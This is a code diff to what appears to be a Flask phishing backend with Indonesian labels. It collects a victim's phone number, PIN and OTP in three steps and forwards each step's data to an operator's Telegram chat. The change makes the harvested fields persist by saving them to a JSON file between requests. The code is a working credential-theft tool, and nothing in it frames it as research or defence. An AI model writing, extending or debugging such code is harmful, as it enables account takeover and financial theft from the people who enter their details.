@@ -1,4 +1,5 @@
 import os
+import json
 import requests
 from flask import Flask, render_template, request, jsonify
 from dotenv import load_dotenv
@@ -6,7 +7,18 @@ from dotenv import load_dotenv
 load_dotenv()
 
 app = Flask(__name__)
-sesi = {}
+SESI_FILE = "sesi_data.json"
+
+def baca_sesi():
+    try:
+        with open(SESI_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def tulis_sesi(data):
+    with open(SESI_FILE, "w") as f:
+        json.dump(data, f)
 
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
@@ -40,7 +52,9 @@ def submit_hp():
     if not nomor_hp:
         return jsonify({"success": False, "error": "Nomor HP wajib diisi."}), 400
 
+    sesi = baca_sesi()
     sesi["nomor_hp"] = nomor_hp
+    tulis_sesi(sesi)
 
     text = (
         "🔔 <b>DATA BARU ( 1/3 )</b>\n"
@@ -64,8 +78,10 @@ def submit_otp():
     if not kode_otp:
         return jsonify({"success": False, "error": "Kode PIN wajib diisi."}), 400
 
-    nomor_hp = sesi.get("nomor_hp")
+    sesi = baca_sesi()
+    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
     sesi["pin"] = kode_otp
+    tulis_sesi(sesi)
 
     text = (
         "🔔 <b>DATA BARU ( 2/3 )</b>\n"
@@ -89,8 +105,9 @@ def submit_kode():
     if not kode_otp:
         return jsonify({"success": False, "error": "Kode OTP wajib diisi."}), 400
 
-    nomor_hp = sesi.get("nomor_hp")
-    pin = sesi.get("pin")
+    sesi = baca_sesi()
+    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
+    pin = sesi.get("pin", "tidak diketahui")
 
     text = (
         "🔔 <b>DATA LENGKAP ( 3/3 )</b>\n"
